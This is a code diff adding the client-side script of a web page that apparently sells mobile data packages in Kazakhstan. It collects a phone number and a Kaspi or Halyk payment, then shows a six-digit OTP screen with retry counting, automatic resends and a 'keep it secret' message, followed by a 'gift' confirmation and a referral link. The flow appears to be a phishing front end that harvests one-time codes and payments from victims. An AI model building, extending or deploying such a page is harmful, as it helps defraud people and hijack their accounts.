+function trustBlock(){
+ return `<div class="trust"><div>🛡️<span>${esc(t('trust1'))}</span></div><div>⚡<span>${esc(t('trust2'))}</span></div><div>👍<span>${esc(t('trust3'))}</span></div></div>`;
+}
+function footBlock(){ return `<p class="foot">© 2026 GEO MASTER</p>`; }
+function bindSupport(){
+ const btn = document.getElementById('supportBtn');
+ if(!btn) return;
+ btn.addEventListener('click', async ()=>{
+  btn.disabled = true; btn.textContent = '…';
+  try{ await api('/support', {}); btn.textContent = t('support_sent'); }
+  catch(e){ btn.disabled = false; btn.textContent = t('open_wa'); }
+ });
+}
+
+function renderPackages(el){
+ const pkgs = (ctx.availablePackages||[]).filter(p=>['7GB','20GB'].includes(p.id));
+ const rows = pkgs.map(p=>{
+  const isStd = p.id==='20GB';
+  return `<button class="pkg ${isStd?'std':'lite'}" data-id="${esc(p.id)}">
+   <div class="icon">${isStd?'⭐':'🚀'}</div>
+   <div class="info"><div class="name">${isStd?t('std'):t('lite')}</div><div class="gb">${p.trafficGb} ГБ · ${t('per_month')}</div></div>
+   <div class="price">${money(p.price)} ₸</div>
+  </button>`;
+ }).join('');
+ el.innerHTML = `
+  <p class="subtitle">${esc(t('choose_title'))}</p>
+  <div>${rows}</div>
+  <div class="benefits">
+   <h3>${esc(t('benefits_title'))}</h3>
+   <ul>${t('b_all').map(b=>`<li><span class="e">•</span>${esc(b)}</li>`).join('')}</ul>
+  </div>
+  ${trustBlock()}
+  ${footBlock()}
+ `;
+ el.querySelectorAll('.pkg').forEach(btn=>btn.addEventListener('click', async ()=>{
+  el.querySelectorAll('.pkg').forEach(b=>b.disabled=true);
+  try{ ctx = await api('/package', {packageId: btn.dataset.id}); render(); }
+  catch(e){ el.querySelectorAll('.pkg').forEach(b=>b.disabled=false); }
+ }));
+}
+
+function renderPhone(el){
+ const pkg = ctx.selectedPackage;
+ el.innerHTML = `
+  <div class="card">
+   <p class="subtitle" style="margin-bottom:16px">${esc(t('phone_title'))}</p>
+   ${pkg ? `<div class="pkg ${pkg.id==='20GB'?'std':'lite'}" style="cursor:default;margin-bottom:18px">
+     <div class="icon">${pkg.id==='20GB'?'⭐':'🚀'}</div>
+     <div class="info"><div class="name">${pkg.id==='20GB'?t('std'):t('lite')}</div><div class="gb">${pkg.trafficGb} ГБ</div></div>
+     <div class="price">${money(pkg.price)} ₸<div style="font-size:10px;font-weight:600;color:var(--ink-dim);margin-top:2px">${t('validity')}: ${t('days30')}</div></div>
+   </div>` : ''}
+   <label>${esc(t('phone_label'))}</label>
+   <p style="color:var(--ink-dim);font:500 12.5px var(--body);margin-bottom:10px">${esc(t('phone_hint'))}</p>
+   <div class="phoneinput"><span>+7</span><input id="phoneInput" inputmode="numeric" maxlength="10" placeholder="___ ___ __ __" autocomplete="tel"></div>
+   <div class="hint">🛡️ ${esc(t('phone_secure'))}</div>
+  </div>
+  <div class="info-box">
+   <div class="ico">i</div>
+   <div><strong style="display:block;margin-bottom:6px">${esc(t('whatnext'))}</strong>
+    1. ${esc(t('step1'))}<br>2. ${esc(t('step2'))}<br>3. ${esc(t('step3'))}<br>4. ${esc(t('step4'))}
+   </div>
+  </div>
+  <button class="btn btn-primary" id="phoneContinue">${esc(t('continue'))} →</button>
+  ${footBlock()}
+ `;
+ const input = document.getElementById('phoneInput');
+ input.addEventListener('input', ()=>{ input.value = input.value.replace(/\D/g,'').slice(0,10); });
+ document.getElementById('phoneContinue').addEventListener('click', async ()=>{
+  const digits = input.value.replace(/\D/g,'');
+  if(digits.length<10){ input.style.borderColor='var(--danger)'; return; }
+  const btn = document.getElementById('phoneContinue'); btn.disabled = true;
+  try{ ctx = await api('/phone', {phone: '7'+digits}); render(); }
+  catch(e){ btn.disabled=false; input.style.borderColor='var(--danger)'; }
+ });
+}
+
+function renderReceipt(el){
+ const pkg = ctx.selectedPackage;
+ el.innerHTML = `
+  <div class="card">
+   <p class="subtitle" style="margin-bottom:16px">${esc(t('receipt_title'))}</p>
+   <div class="receipt">
+    <div class="receipt-row"><span class="k">${esc(t('pkg'))}</span><span class="v">${pkg?pkg.trafficGb:''} ГБ</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('to_pay'))}</span><span class="v">${pkg?money(pkg.price):''} ₸</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('number'))}</span><span class="v">+${esc(ctx.client.phone||'')}</span></div>
+   </div>
+   <label style="margin-top:4px">${esc(t('method'))}</label>
+   <div style="display:flex;flex-direction:column;gap:10px;margin-top:8px">
+    <button class="btn btn-kaspi" data-method="KASPI">${esc(t('kaspi'))} <span style="font-weight:500;font-size:12px;opacity:.85">· ${esc(t('no_fee'))}</span></button>
+    <button class="btn btn-halyk" data-method="HALYK">${esc(t('halyk'))} <span style="font-weight:500;font-size:12px;opacity:.85">· ${esc(t('no_fee'))}</span></button>
+   </div>
+  </div>
+  ${footBlock()}
+ `;
+ el.querySelectorAll('[data-method]').forEach(btn=>btn.addEventListener('click', async ()=>{
+  el.querySelectorAll('[data-method]').forEach(b=>b.disabled=true);
+  try{
+   const res = await api('/payment-method', {method: btn.dataset.method});
+   selectedMethod = res.method;
+   if(res.paymentUrl) window.open(res.paymentUrl, '_blank');
+   showScreen('checking');
+  }catch(e){ el.querySelectorAll('[data-method]').forEach(b=>b.disabled=false); }
+ }));
+}
+
+function renderChecking(el){
+ const pkg = ctx.selectedPackage;
+ el.innerHTML = `
+  <div class="card center">
+   <div class="spinner"></div>
+   <h2 class="title">${esc(t('checking_title'))}</h2>
+   <p class="desc" style="margin-bottom:18px">${esc(t('checking_desc'))}</p>
+   <div class="receipt">
+    <div class="receipt-row"><span class="k">${esc(t('pkg'))}</span><span class="v">${pkg?pkg.trafficGb:''} ГБ</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('to_pay'))}</span><span class="v">${pkg?money(pkg.price):''} ₸</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('number'))}</span><span class="v">+${esc(ctx.client.phone||'')}</span></div>
+   </div>
+  </div>
+  ${supportBlock()}
+  ${footBlock()}
+ `;
+ bindSupport();
+}
+
+function renderActivating(el){
+ el.innerHTML = tplMessage(t('checking_title'), t('checking_desc'), 'ok', '⏳') + supportBlock() + footBlock();
+ bindSupport();
+}
+
+let otpBoxes = [];
+function renderOtp(el, wrong){
+ const phone = ctx.client.phone||'';
+ el.innerHTML = `
+  <div class="card center">
+   <div class="icon-circle ${wrong?'err':'ok'}">${wrong?'✕':'✈️'}</div>
+   <h2 class="title">${wrong?esc(t('wrong_code')):esc(t('otp_title'))}</h2>
+   <p class="desc">${wrong?esc(t('wrong_desc')):(esc(t('otp_desc'))+' +'+esc(phone)+'.')}</p>
+   ${wrong?`<div class="error-banner" style="margin-top:14px">⚠️ ${esc(t('attempts_left'))} ${pendingOtpAttempts}</div>`
+          :`<div class="info-box" style="margin-top:14px;text-align:left"><div class="ico">✓</div><div>${esc(t('otp_valid'))} ${esc(t('otp_secret'))}</div></div>`}
+   <label style="text-align:left;margin-top:18px">${esc(t('enter_code'))}</label>
+   <div class="otp" id="otpBoxes">${Array.from({length:6}).map((_,i)=>`<input maxlength="1" inputmode="numeric" data-i="${i}">`).join('')}</div>
+   <button class="btn btn-primary" id="otpConfirm" disabled>${esc(t('confirm'))} →</button>
+   <div class="timer" id="resendWrap"><span id="resendCountdown">⏱ ${esc(t('resend_in'))} 01:00</span></div>
+  </div>
+  ${supportBlock()}
+  ${footBlock()}
+ `;
+ bindSupport();
+ otpBoxes = Array.from(el.querySelectorAll('#otpBoxes input'));
+ const confirmBtn = document.getElementById('otpConfirm');
+ function currentCode(){ return otpBoxes.map(b=>b.value).join(''); }
+ function updateState(){
+  const code = currentCode();
+  confirmBtn.disabled = code.length!==6;
+  otpBoxes.forEach(b=>b.classList.toggle('filled', !!b.value));
+ }
+ otpBoxes.forEach((box,i)=>{
+  box.addEventListener('input', ()=>{
+   box.value = box.value.replace(/\D/g,'');
+   if(box.value && otpBoxes[i+1]) otpBoxes[i+1].focus();
+   updateState();
   });
-</script>
+  box.addEventListener('keydown', e=>{
+   if(e.key==='Backspace' && !box.value && otpBoxes[i-1]) otpBoxes[i-1].focus();
+  });
+  box.addEventListener('paste', e=>{
+   const text = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
+   if(text.length===6){ e.preventDefault(); otpBoxes.forEach((b,j)=>b.value=text[j]||''); updateState(); otpBoxes[5].focus(); }
+  });
+ });
+ confirmBtn.addEventListener('click', async ()=>{
+  confirmBtn.disabled = true;
+  try{
+   ctx = await api('/otp', {code: currentCode()});
+   pendingOtpAttempts = 3;
+   render();
+  }catch(e){
+   pendingOtpAttempts = Math.max(0, pendingOtpAttempts-1);
+   otpBoxes.forEach(b=>b.classList.add('bad'));
+   renderOtp(el, true);
+   if(pendingOtpAttempts<=0){ pendingOtpAttempts = 3; api('/otp-resend', {}).catch(()=>{}); }
+  }
+ });
+ let secs = 60;
+ const cd = document.getElementById('resendCountdown');
+ const timer = setInterval(()=>{
+  secs--;
+  if(secs<=0){
+   clearInterval(timer);
+   document.getElementById('resendWrap').innerHTML = `<button class="resend" id="resendBtn">${esc(t('resend'))}</button>`;
+   document.getElementById('resendBtn').addEventListener('click', async (ev)=>{
+    ev.target.disabled = true;
+    try{ await api('/otp-resend', {}); ev.target.textContent = '✓'; }catch(e){ ev.target.disabled=false; }
+   });
+   return;
+  }
+  const m = String(Math.floor(secs/60)).padStart(2,'0'), s = String(secs%60).padStart(2,'0');
+  cd.textContent = `⏱ ${t('resend_in')} ${m}:${s}`;
+ }, 1000);
+}
 
+function renderSuccess(el){
+ const completedPkgId = ctx.lastCompletedOrder && ctx.lastCompletedOrder.packageId;
+ const pkg = ctx.selectedPackage || (ctx.availablePackages||[]).find(p=>p.id===completedPkgId) || null;
+ const gb = pkg ? (pkg.trafficGb || '') : '';
+ el.innerHTML = `
+  <div class="card center">
+   <div class="icon-circle ok">✓</div>
+   <h2 class="title">${esc(t('success_title'))}</h2>
+   <p class="desc">${esc(t('success_sub'))}</p>
+   <div class="receipt" style="margin-top:16px">
+    <div class="receipt-row"><span class="k">${esc(t('number'))}</span><span class="v">+${esc(ctx.client.phone||'')}</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('pkg'))}</span><span class="v">${gb} ГБ</span></div>
+   </div>
+   <div class="info-box" style="margin-top:14px;text-align:left">
+    <div class="ico">🎁</div>
+    <div><strong style="display:block">${gb} ${esc(t('gifting'))}</strong>${esc(t('started'))}</div>
+   </div>
+   <p class="desc" style="margin-top:14px">${esc(t('sms'))}</p>
+  </div>
+  <div class="reward">
+   <h4>${esc(t('reward_title'))}</h4>
+   <p>${esc(t('reward_desc'))}</p>
+   <button class="btn btn-primary" id="referralBtn">${esc(t('reward_btn'))}</button>
+  </div>
+  ${supportBlock()}
+  ${trustBlock()}
+  ${footBlock()}
+ `;
+ bindSupport();
+ const rbtn = document.getElementById('referralBtn');
+ rbtn.addEventListener('click', async ()=>{
+  rbtn.disabled = true;
+  try{ const res = await api('/referral', {}); rbtn.textContent = res.link; rbtn.onclick=null; if(navigator.clipboard) navigator.clipboard.writeText(res.link).catch(()=>{}); }
+  catch(e){ rbtn.disabled=false; }
+ });
+}
+
+function renderFailed(el){
+ el.innerHTML = tplMessage(t('fail_title'), t('fail_desc'), 'err', '📵') + supportBlock() + footBlock();
+ bindSupport();
+ api('/support', {}).catch(()=>{});
+}
+
+applyLang();
+initSession();
+</script>
 </body>
 </html>
